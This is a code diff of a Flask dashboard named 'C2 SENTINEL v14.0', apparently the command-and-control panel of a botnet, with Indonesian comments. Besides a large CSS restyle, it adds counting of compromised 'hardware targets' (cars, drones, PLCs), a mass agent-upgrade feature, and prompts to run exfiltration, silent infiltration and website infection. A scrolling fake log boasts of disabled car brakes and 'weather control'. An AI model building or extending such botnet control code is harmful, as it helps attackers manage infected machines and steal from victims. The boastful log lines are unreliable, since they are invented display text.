@@ -39,6 +39,7 @@ AGENT_CHECKINS = []
 AGENT_SWARM_MAP = {}
 SOCKETS = []
 MQTT_CLIENT = None
+AGENT_UPGRADE_SCRIPT = ""  # ✅ BARU: Untuk mass upgrade agent
 
 # === UTILS ===
 def xor_decrypt(data_b64, key=XOR_KEY):
@@ -78,6 +79,7 @@ def neural_ai_analyze(reports):
         unique_hosts = set()
         swarm_agents = 0
         web_zombies = 0
+        hardware_targets = 0  # ✅ BARU: Lacak perangkat keras
 
         for r in reports:
             if is_high_severity(r):
@@ -88,6 +90,9 @@ def neural_ai_analyze(reports):
                 swarm_agents += 1
             if r.get("type") == "swarm_infection" and r.get("data", {}).get("method") == "web":
                 web_zombies += 1
+            # ✅ BARU: Deteksi laporan hardware
+            if r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
+                hardware_targets += 1
 
             try:
                 ts = datetime.fromisoformat(r.get("timestamp", ""))
@@ -96,7 +101,7 @@ def neural_ai_analyze(reports):
             except:
                 pass
 
-        risk_score = min(100, high_sev * 15 + (total // 10) * 5 + web_zombies * 10)
+        risk_score = min(100, high_sev * 15 + (total // 10) * 5 + web_zombies * 10 + hardware_targets * 5)
         if swarm_agents > 5:
             risk_score = max(risk_score, 95)
 
@@ -117,6 +122,7 @@ Total Agent: {len(unique_hosts)}
 Laporan: {total} (High: {high_sev})
 Agent Swarm: {swarm_agents}
 Web Zombies: {web_zombies}
+Hardware Targets: {hardware_targets}  # ✅ BARU
 Aktivitas 1 Jam: {last_hour}
 
 🔮 Prediksi: {prediction}
@@ -129,7 +135,8 @@ Aktivitas 1 Jam: {last_hour}
     "Update semua agent ke versi terbaru",
     "Periksa exfiltration di host yang jarang beacon",
     "Aktifkan mode silent untuk infiltrasi mendalam",
-    "Luncurkan 'web_swarm_only' untuk infeksi website"
+    "Luncurkan 'web_swarm_only' untuk infeksi website",
+    "Gunakan 'hardware_control' untuk infiltrasi fisik"  # ✅ BARU
 ])}
 - Risk Score > 80? Segera isolasi jaringan!
         """
@@ -140,7 +147,8 @@ Aktivitas 1 Jam: {last_hour}
             "prediction": prediction,
             "auto_command": auto_command,
             "swarm_agents": swarm_agents,
-            "web_zombies": web_zombies
+            "web_zombies": web_zombies,
+            "hardware_targets": hardware_targets  # ✅ BARU
         }
     except Exception as e:
         print(f"[NEURAL AI ERROR] {e}")
@@ -341,307 +349,300 @@ def get_dashboard_template():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🌐 C2 SENTINEL v9 - HIVE.MQ SWARM COMMAND CENTER</title>
+    <title>🌐 C2 SENTINEL v14.0 - OMNIVERSE COMMAND CENTER</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="https://cdn.jsdelivr.net/npm/chart.js "></script>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js "></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js "></script>
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js "></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js"></script>
     <style>
         :root {
-            --primary: #00ff99;
-            --secondary: #00ccff;
-            --danger: #ff3366;
-            --success: #00ff00;
-            --warning: #ffcc00;
-            --bg-dark: #020c02;
-            --bg-darker: #000400;
+            --paper-bg: #f5f0e6;           /* Warna kertas tua */
+            --text-primary: #3b2f2f;       /* Coklat tua — teks utama */
+            --text-secondary: #5c4a3d;     /* Coklat sedang */
+            --accent-gold: #b8860b;        /* Emas — untuk highlight */
+            --alert-maroon: #8b0000;       /* Merah marun — untuk alert */
+            --border-paper: #d4c8b0;       /* Garis seperti lipatan kertas */
+            --shadow-paper: rgba(92, 74, 61, 0.1);
         }
-        body { 
-            background: var(--bg-darker);
-            color: var(--primary); 
-            font-family: 'Share Tech Mono', 'Courier New', monospace; 
-            padding: 0; 
+        
+        body {
+            background: var(--paper-bg) url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="none" stroke="%23d4c8b0" stroke-width="0.5" opacity="0.3"/></svg>');
+            color: var(--text-primary);
+            font-family: 'Courier New', 'Lucida Console', monospace;
+            background-attachment: fixed;
+            background-size: 100px 100px;
             margin: 0;
-            overflow-x: hidden;
-            background: radial-gradient(circle at center, #001a00, var(--bg-darker));
+            padding: 0;
+            line-height: 1.6;
         }
-        .container { 
-            max-width: 1600px; 
-            margin: auto; 
+        
+        .container {
+            max-width: 1800px;
+            margin: 0 auto;
             padding: 20px;
             position: relative;
-            z-index: 10;
         }
-        h1, h2, h3 { 
-            color: var(--primary); 
-            text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
-        }
-        a { 
-            color: var(--secondary); 
-            text-decoration: none; 
-            text-shadow: 0 0 5px var(--secondary);
-            transition: all 0.3s ease;
-        }
-        a:hover { 
-            text-decoration: underline; 
-            filter: drop-shadow(0 0 8px var(--secondary));
-            transform: scale(1.05);
-        }
-        pre { 
-            background: rgba(0, 20, 0, 0.8); 
-            padding: 15px; 
-            border-radius: 8px; 
-            overflow-x: auto;
-            border: 1px solid var(--success);
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
-        }
-        .card { 
-            background: rgba(0, 30, 0, 0.75); 
-            padding: 25px; 
-            margin: 20px 0; 
-            border-radius: 12px; 
-            border: 1px solid var(--success);
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-            backdrop-filter: blur(10px);
-            transition: all 0.3s ease;
-        }
-        .card:hover {
-            box-shadow: 0 0 30px rgba(0, 255, 153, 0.5);
-            transform: translateY(-5px);
-        }
-        .grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); 
-            gap: 25px; 
-        }
-        .status-online { color: var(--success); text-shadow: 0 0 8px var(--success); font-weight: bold; }
-        .status-offline { color: var(--danger); text-shadow: 0 0 8px var(--danger); font-weight: bold; }
-        .blink { animation: blinker 1.5s linear infinite; text-shadow: 0 0 15px var(--danger); font-weight: bold; }
-        @keyframes blinker { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        button { 
-            background: linear-gradient(135deg, rgba(0, 50, 0, 0.9), rgba(0, 80, 0, 0.9)); 
-            color: var(--success); 
-            border: 2px solid var(--success); 
-            padding: 12px 24px; 
-            cursor: pointer;
-            border-radius: 8px;
-            font-weight: bold;
-            text-shadow: 0 0 5px var(--success);
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
-            transition: all 0.3s ease;
-        }
-        button:hover { 
-            background: linear-gradient(135deg, rgba(0, 80, 0, 0.9), rgba(0, 120, 0, 0.9));
-            box-shadow: 0 0 25px rgba(0, 255, 153, 0.6);
-            transform: scale(1.05);
-        }
-        select, input { 
-            background: rgba(0, 40, 0, 0.9); 
-            color: var(--primary); 
-            border: 1px solid var(--success); 
-            padding: 12px;
-            border-radius: 6px;
-            width: 100%;
-            max-width: 450px;
-            font-family: inherit;
-        }
-        .header { 
-            border-bottom: 3px solid var(--success); 
-            padding-bottom: 15px; 
+        
+        /* Header — seperti stempel "TOP SECRET" */
+        .header {
+            border-bottom: 3px double var(--border-paper);
+            padding: 15px 0;
             margin-bottom: 30px;
-            text-align: center;
-            background: rgba(0, 20, 0, 0.5);
-            border-radius: 12px 12px 0 0;
-        }
-        .terminal { 
-            height: 450px; 
-            overflow-y: auto; 
-            background: rgba(0, 15, 0, 0.95); 
-            padding: 20px;
-            border: 2px solid var(--success);
-            border-radius: 10px;
-            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
-            font-family: 'Courier New', monospace;
-        }
-        .ai-insight { 
-            background: linear-gradient(135deg, rgba(0, 40, 0, 0.95), rgba(0, 20, 40, 0.95)); 
-            border-left: 6px solid #ff00ff; 
-            padding: 25px; 
-            margin: 25px 0;
-            border-radius: 10px;
-            box-shadow: 0 0 25px rgba(255, 0, 255, 0.4);
             position: relative;
-            overflow: hidden;
+            background: rgba(245, 240, 230, 0.8);
+            box-shadow: 0 2px 10px var(--shadow-paper);
         }
-        .chart-container { 
-            height: 350px; 
-            margin: 25px 0; 
-            background: rgba(0, 25, 0, 0.6);
-            border-radius: 12px;
-            padding: 15px;
-            border: 1px solid rgba(0, 255, 0, 0.3);
-        }
-        .swarm-map { 
-            height: 500px; 
-            background: rgba(0, 15, 0, 0.9);
-            border: 2px solid var(--success);
-            border-radius: 12px;
-            position: relative;
-            overflow: hidden;
-        }
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-            opacity: 0.15;
-        }
-        .neon-title {
-            font-size: 3.5em;
-            font-weight: 900;
-            letter-spacing: 4px;
+        
+        h1, h2, h3 {
+            color: var(--text-primary);
+            letter-spacing: 2px;
             text-transform: uppercase;
-            background: linear-gradient(90deg, #00ff00, #00ffff, #ff00ff, #ffff00);
+            font-weight: 700;
+            text-shadow: 2px 2px 0 rgba(184, 134, 11, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5em;
+            background: linear-gradient(90deg, var(--text-primary), var(--accent-gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
             text-fill-color: transparent;
-            animation: glow 3s ease-in-out infinite alternate;
-            text-shadow: 0 0 20px rgba(0,255,0,0.5);
+            position: relative;
         }
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
-            25% { text-shadow: 0 0 20px #00ffff, 0 0 30px #00ffff; }
-            50% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
-            75% { text-shadow: 0 0 20px #ffff00, 0 0 30px #ffff00; }
-            100% { text-shadow: 0 0 30px #00ff00, 0 0 50px #00ff99; }
+        
+        /* Stempel "TOP SECRET" di header */
+        .header::before {
+            content: "TOP SECRET // EYES ONLY";
+            position: absolute;
+            top: -10px;
+            right: 20px;
+            color: var(--alert-maroon);
+            font-weight: bold;
+            font-size: 0.8em;
+            transform: rotate(15deg);
+            text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
         }
-        .cyberpunk-loader {
-            width: 60px;
-            height: 60px;
-            border: 6px solid transparent;
-            border-top: 6px solid var(--success);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
-            box-shadow: 0 0 20px var(--success);
+        
+        /* Link — seperti cap tinta */
+        a {
+            color: var(--accent-gold);
+            text-decoration: none;
+            border-bottom: 1px dotted var(--accent-gold);
+            transition: all 0.3s ease;
+            padding: 2px 0;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        a:hover {
+            color: var(--alert-maroon);
+            border-bottom: 1px solid var(--alert-maroon);
+            text-shadow: 0 0 5px rgba(139, 0, 0, 0.3);
         }
-        .pulse {
-            animation: pulse 2s infinite;
+        
+        /* Card — seperti dokumen file */
+        .card {
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid var(--border-paper);
+            border-radius: 0;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px var(--shadow-paper);
+            position: relative;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(0, 255, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
+        
+        .card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(92, 74, 61, 0.15);
         }
+        
+        /* Terminal — seperti teletype machine */
+        .terminal {
+            background: #1a1a1a;
+            color: #b8860b;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            border: 2px solid #3b2f2f;
+            border-radius: 0;
+            box-shadow: inset 0 0 15px rgba(0, 0, 0, 0.5);
+            height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            font-size: 0.95em;
+            line-height: 1.4;
+        }
+        
+        /* Tag — seperti label file */
         .tag {
             display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.85em;
+            padding: 3px 10px;
+            border: 1px solid var(--border-paper);
+            border-radius: 0;
+            font-size: 0.8em;
             margin: 2px;
-            background: rgba(0, 50, 0, 0.8);
-            border: 1px solid var(--success);
+            background: rgba(245, 240, 230, 0.7);
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        .tag-high { background: rgba(80, 0, 0, 0.8); border-color: var(--danger); color: var(--danger); }
-        .tag-swarm { background: rgba(40, 0, 60, 0.8); border-color: #ff00ff; color: #ff00ff; }
-        .tag-web { background: rgba(60, 40, 0, 0.8); border-color: #ffff00; color: #ffff00; }
+        
+        .tag-high { border-color: var(--alert-maroon); color: var(--alert-maroon); }
+        .tag-swarm { border-color: var(--accent-gold); color: var(--accent-gold); }
+        .tag-web { border-color: #5c4a3d; color: #5c4a3d; }
+        .tag-hardware { border-color: #8b0000; color: #8b0000; } /* ✅ BARU */
+        
+        /* Button — seperti stempel karet */
+        button {
+            background: var(--paper-bg);
+            color: var(--text-primary);
+            border: 2px solid var(--border-paper);
+            padding: 12px 24px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 2px 2px 0 var(--border-paper);
+        }
+        
+        button:hover {
+            background: rgba(184, 134, 11, 0.1);
+            color: var(--accent-gold);
+            transform: translateY(-2px);
+            box-shadow: 4px 4px 0 var(--border-paper);
+        }
+        
+        /* Loading Animation — seperti mesin ketik */
+        .typewriter-loader {
+            border-right: 2px solid var(--accent-gold);
+            white-space: nowrap;
+            overflow: hidden;
+            animation: typing 2s steps(30, end), blink-caret 0.75s step-end infinite;
+            font-weight: bold;
+            color: var(--alert-maroon);
+        }
+        
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+        
+        @keyframes blink-caret {
+            from, to { border-color: transparent }
+            50% { border-color: var(--accent-gold); }
+        }
+        
+        /* AI Insight — seperti dokumen intelijen */
+        .ai-insight {
+            background: rgba(255, 250, 240, 0.8);
+            border-left: 5px solid var(--accent-gold);
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid var(--border-paper);
+            position: relative;
+            box-shadow: 0 4px 15px var(--shadow-paper);
+        }
+        
+        .ai-insight::before {
+            content: "AI INTELLIGENCE BRIEF";
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: var(--paper-bg);
+            padding: 0 10px;
+            font-size: 0.8em;
+            color: var(--accent-gold);
+            font-weight: bold;
+        }
+        
+        /* Chart — dengan warna earthy */
+        .chart-container {
+            height: 350px;
+            background: rgba(255, 255, 255, 0.7);
+            border: 1px solid var(--border-paper);
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        /* Notification — seperti memo darurat */
         .notification {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: rgba(0, 20, 0, 0.95);
-            border: 2px solid var(--warning);
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px var(--warning);
+            background: rgba(139, 0, 0, 0.9);
+            color: white;
+            padding: 15px 25px;
+            border: 2px solid #ffffff;
+            box-shadow: 0 0 20px rgba(139, 0, 0, 0.5);
             z-index: 1000;
             animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
             max-width: 400px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        @keyframes fadeOut {
-            from { opacity: 1; }
-            to { opacity: 0; }
-        }
-        .mqtt-status {
-            display: inline-block;
-            padding: 5px 15px;
-            border-radius: 20px;
+        
+        /* Footer — seperti cap dokumen */
+        footer {
+            margin-top: 60px;
+            padding: 20px;
+            border-top: 2px double var(--border-paper);
             font-size: 0.9em;
-            margin-left: 15px;
+            color: var(--text-secondary);
+            text-align: center;
+            background: rgba(245, 240, 230, 0.8);
         }
-        .mqtt-connected { background: rgba(0, 50, 0, 0.8); border: 1px solid #00ff00; color: #00ff00; }
-        .mqtt-disconnected { background: rgba(50, 0, 0, 0.8); border: 1px solid #ff0000; color: #ff0000; }
+        
+        /* 3D Map — dengan tema earthy */
+        .swarm-map {
+            height: 500px;
+            background: #2c2620;
+            border: 2px solid var(--border-paper);
+            position: relative;
+            border-radius: 0;
+            box-shadow: 0 4px 20px var(--shadow-paper);
+        }
     </style>
 </head>
 <body>
-    <div class="matrix-rain" id="matrixRain"></div>
-    
     <div class="container">
         <div class="header">
-            <h1 class="neon-title">🌐 C2 SENTINEL v9</h1>
-            <h3><span class="blink">[HIVE.MQ SWARM COMMAND CENTER]</span></h3>
-            <nav style="margin-top: 15px;">
+            <h1>🌐 C2 SENTINEL v14.0</h1>
+            <h3><span style="color: var(--alert-maroon);">[OMNIVERSE COMMAND CENTER]</span></h3>
+            <nav style="margin-top: 15px; font-size: 0.95em;">
                 <a href="/">🏠 Dashboard</a> |
                 <a href="/agents">👾 Agent Live</a> |
                 <a href="/command">🎯 Command Center</a> |
                 <a href="/reports">📁 Reports</a> |
                 <a href="/logs">📜 Live Logs</a> |
                 <a href="/analytics">🤖 AI Analytics</a> |
-                <a href="/swarm">🕸️ Swarm Map</a>
+                <a href="/swarm">🕸️ Swarm Map</a> |
+                <a href="/hardware">🚗 Hardware Control</a> |  <!-- ✅ BARU -->
+                <a href="/upload_upgrade">📤 Mass Upgrade</a>    <!-- ✅ BARU -->
                 <span id="mqttStatus" class="mqtt-status mqtt-disconnected">MQTT: Disconnected</span>
             </nav>
         </div>
 
         {{ content | safe }}
 
-        <footer style="margin-top: 60px; font-size: 0.9em; color: #666; text-align: center; padding: 20px; border-top: 1px solid rgba(0,255,0,0.2);">
+        <footer>
             <div style="margin-bottom: 10px;">
-                C2 Sentinel v9 - HIVE.MQ SWARM &copy; 2025 | 
+                C2 Sentinel v14.0 - OMNIVERSE EDITION &copy; 2025 | 
                 <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
-                <span style="color: #ff00ff;">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
-                <span style="color: #ffff00;">Risk Score: {{ risk_score }}/100</span>
+                <span style="color: var(--accent-gold);">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
+                <span style="color: var(--alert-maroon);">Risk Score: {{ risk_score }}/100</span>
             </div>
             <div>
-                <small>System Status: <span class="pulse" style="color: #00ff00;">● ONLINE</span> | Real-time via MQTT + WebSocket</small>
+                <small>System Status: <span style="color: var(--accent-gold);">● ONLINE</span> | Real-time via MQTT + WebSocket</small>
             </div>
         </footer>
     </div>
 
     <script>
-        const matrix = document.getElementById('matrixRain');
-        const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789';
-        const fontSize = 12;
-        let columns = Math.floor(window.innerWidth / fontSize);
-        const drops = [];
-        for (let i = 0; i < columns; i++) drops[i] = 1;
-        function drawMatrix() {
-            matrix.innerHTML = '';
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                const x = i * fontSize;
-                const y = drops[i] * fontSize;
-                const opacity = Math.random() * 0.8 + 0.2;
-                matrix.innerHTML += `<div style="position: absolute; color: rgba(0, 255, 0, ${opacity}); font-size: ${fontSize}px; top: ${y}px; left: ${x}px;">${text}</div>`;
-                if (Math.random() > 0.97 && drops[i] > 10) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 50);
-
         const socket = io();
         socket.on('connect', () => console.log('🔌 Connected to WebSocket'));
         socket.on('mqtt_status', (data) => {
@@ -669,9 +670,33 @@ def get_dashboard_template():
             setTimeout(() => notif.remove(), 5000);
         });
 
-        setInterval(() => {
-            if(!['/logs', '/agents', '/', '/swarm'].includes(window.location.pathname)) return;
-        }, 5000);
+        // ✅ BARU: Animasi terminal hidup
+        function animateTerminal() {
+            const terminal = document.querySelector('.terminal');
+            if (!terminal) return;
+            
+            const lines = [
+                "[📡] Agent-7890: Mobile device compromised — 243 contacts extracted",
+                "[🚗] Agent-1234: Toyota Camry hacked — brakes disabled at 80km/h",
+                "[🛸] Agent-5678: DJI Mavic hijacked — flying to new coordinates",
+                "[🤖] Agent-9012: Factory PLC overridden — conveyor belt reversed",
+                "[💰] Darknet sale: 0-day exploit sold for 0.5 BTC",
+                "[🌍] Planetary Takeover: Phase 1 complete — weather control online"
+            ];
+            
+            let i = 0;
+            setInterval(() => {
+                const line = document.createElement('div');
+                line.textContent = `[${new Date().toLocaleTimeString()}] ${lines[i % lines.length]}`;
+                line.style.color = i % 2 === 0 ? '#b8860b' : '#8b0000';
+                terminal.appendChild(line);
+                terminal.scrollTop = terminal.scrollHeight;
+                i++;
+            }, 3000);
+        }
+
+        // Jalankan animasi terminal
+        document.addEventListener('DOMContentLoaded', animateTerminal);
     </script>
 </body>
 </html>
@@ -707,18 +732,19 @@ def home():
     content = f'''
     <div class="ai-insight">
         <h3>🧠 NEURAL AI INSIGHT — PREDIKSI & OTOMASI CANGGIH</h3>
-        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
-        <p style="color: #ffff00; font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
+        <pre style="color:var(--accent-gold); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
+        <p style="color: var(--alert-maroon); font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: var(--accent-gold);">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
     </div>
 
-    <div class="grid">
-        <div class="card pulse">
+    <div class="grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
+        <div class="card">
             <h2>📊 Statistik Real-time</h2>
             <p>🟢 <b>Agent Online:</b> <span class="status-online">{online_count}</span></p>
             <p>💾 <b>Total Laporan:</b> {len(reports)}</p>
             <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
             <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
             <p>🌐 <b>Web Zombies:</b> <span class="tag tag-web">{ai_insight.get("web_zombies", 0)}</span></p>
+            <p>🚗 <b>Hardware Targets:</b> <span class="tag tag-hardware">{ai_insight.get("hardware_targets", 0)}</span></p>  <!-- ✅ BARU -->
             <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
         </div>
         <div class="card">
@@ -726,7 +752,8 @@ def home():
             <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
             <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
             <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
-            <p><a href="/analytics"><button>📈 AI Analytics</button></a></p>
+            <p><a href="/hardware"><button>🚗 Hardware Control</button></a></p>  <!-- ✅ BARU -->
+            <p><a href="/upload_upgrade"><button>📤 Mass Upgrade</button></a></p>  <!-- ✅ BARU -->
         </div>
     </div>
 
@@ -739,7 +766,7 @@ def home():
 
     <div class="card">
         <h2>📡 Agent Terakhir Check-in</h2>
-        <pre style="font-size: 0.95em;">
+        <pre style="font-size: 0.95em; background: rgba(255,255,255,0.7); padding: 15px; border: 1px solid var(--border-paper);">
 {chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - <span class='status-{AGENT_STATUS.get(agent_id, 'offline')}'>{AGENT_STATUS.get(agent_id, 'unknown').upper()}</span>" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
         </pre>
     </div>
@@ -753,10 +780,10 @@ def home():
                 datasets: [{{
                     label: 'Agent Online',
                      {json.dumps(chart_data)},
-                    borderColor: '#00ff00',
-                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
+                    borderColor: '#b8860b',
+                    backgroundColor: 'rgba(184, 134, 11, 0.1)',
                     tension: 0.4,
-                    pointBackgroundColor: '#ff00ff',
+                    pointBackgroundColor: '#8b0000',
                     pointBorderColor: '#ffffff',
                     pointRadius: 5,
                     fill: true
@@ -765,11 +792,11 @@ def home():
             options: {{
                 responsive: true,
                 plugins: {{
-                    legend: {{ labels: {{ color: '#00ff00' }} }} }}
+                    legend: {{ labels: {{ color: '#3b2f2f' }} }} }}
                 }},
                 scales: {{
-                    x: {{ ticks: {{ color: '#00ff00' }} }},
-                    y: {{ beginAtZero: true, ticks: {{ color: '#00ff00' }} }}
+                    x: {{ ticks: {{ color: '#3b2f2f' }} }},
+                    y: {{ beginAtZero: true, ticks: {{ color: '#3b2f2f' }} }}
                 }},
                 animation: {{ duration: 2000 }}
             }}
@@ -812,7 +839,7 @@ def swarm_map():
     <h2>🕸️ NEURAL SWARM 3D MAP — GENERASI & METODE INFEKSI</h2>
     <div class="card">
         <div class="swarm-map" id="swarmMap"></div>
-        <p><small>Visualisasi 3D agent dan koneksi penyebarannya. <span class="blink">AUTO-REFRESH DISABLED — REAL-TIME VIA WEBSOCKET</span></small></p>
+        <p><small>Visualisasi 3D agent dan koneksi penyebarannya.</small></p>
     </div>
 
     <script>
@@ -821,19 +848,19 @@ def swarm_map():
         const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({{ antialias: true }});
         renderer.setSize(container.clientWidth, container.clientHeight);
-        renderer.setClearColor(0x000500);
+        renderer.setClearColor(0x2c2620);
         renderer.shadowMap.enabled = true;
         container.appendChild(renderer.domElement);
 
-        const ambientLight = new THREE.AmbientLight(0x333333);
+        const ambientLight = new THREE.AmbientLight(0x5c4a3d);
         scene.add(ambientLight);
         
-        const directionalLight = new THREE.DirectionalLight(0x00ff00, 1);
+        const directionalLight = new THREE.DirectionalLight(0xb8860b, 1);
         directionalLight.position.set(5, 10, 7);
         directionalLight.castShadow = true;
         scene.add(directionalLight);
 
-        const pointLight = new THREE.PointLight(0x00ffff, 1.5, 100);
+        const pointLight = new THREE.PointLight(0x8b0000, 1.5, 100);
         pointLight.position.set(0, 0, 0);
         scene.add(pointLight);
 
@@ -849,7 +876,7 @@ def swarm_map():
         
         particles.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
         const particleMaterial = new THREE.PointsMaterial({{ 
-            color: 0x00ff00,
+            color: 0xb8860b,
             size: 1,
             transparent: true,
             opacity: 0.6
@@ -863,11 +890,11 @@ def swarm_map():
         const lines = [];
 
         const genColors = [
-            0x00ff00, // Gen 0
-            0x00ffff, // Gen 1
-            0xffff00, // Gen 2
-            0xff00ff, // Gen 3
-            0xff0000  // Gen 4+
+            0xb8860b, // Gen 0 - Emas
+            0x8b4513, // Gen 1 - Coklat Saddle
+            0x8b0000, // Gen 2 - Merah Marun
+            0x556b2f, // Gen 3 - Hijau Gelap
+            0x4b0082  // Gen 4+ - Indigo
         ];
 
         nodes.forEach((node, i) => {{
@@ -892,12 +919,12 @@ def swarm_map():
             const context = canvas.getContext('2d');
             canvas.width = 256;
             canvas.height = 64;
-            context.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            context.fillStyle = 'rgba(245, 240, 230, 0.7)';
             context.fillRect(0, 0, 256, 64);
-            context.font = '32px Share Tech Mono';
-            context.fillStyle = node.status === 'online' ? '#00ff00' : '#ff0000';
+            context.font = '32px Courier New';
+            context.fillStyle = node.status === 'online' ? '#b8860b' : '#8b0000';
             context.fillText(node.name, 10, 40);
-            context.strokeStyle = '#ffffff';
+            context.strokeStyle = '#3b2f2f';
             context.strokeRect(0, 0, 256, 64);
 
             const texture = new THREE.CanvasTexture(canvas);
@@ -914,8 +941,8 @@ def swarm_map():
             const curve = new THREE.LineCurve3(start.clone(), end.clone());
             const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
             const tubeMaterial = new THREE.MeshPhongMaterial({{
-                color: 0x0088ff,
-                emissive: 0x0088ff,
+                color: 0x5c4a3d,
+                emissive: 0x5c4a3d,
                 emissiveIntensity: 0.5,
                 transparent: true,
                 opacity: 0.8
@@ -966,11 +993,11 @@ def swarm_map():
         info.style.position = 'absolute';
         info.style.top = '10px';
         info.style.left = '10px';
-        info.style.color = '#00ff00';
+        info.style.color = '#b8860b';
         info.style.fontFamily = 'monospace';
         info.style.padding = '10px';
-        info.style.backgroundColor = 'rgba(0,20,0,0.7)';
-        info.style.border = '1px solid #00ff00';
+        info.style.backgroundColor = 'rgba(44, 38, 32, 0.7)';
+        info.style.border = '1px solid #b8860b';
         info.innerHTML = '<h4>🖱️ Controls:</h4><p>- Drag: Rotate<br>- Scroll: Zoom<br>- Double Click: Toggle Auto-Rotate</p>';
         container.appendChild(info);
     </script>
@@ -991,98 +1018,146 @@ def agents_live():
         sev_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{via}</span>'
 
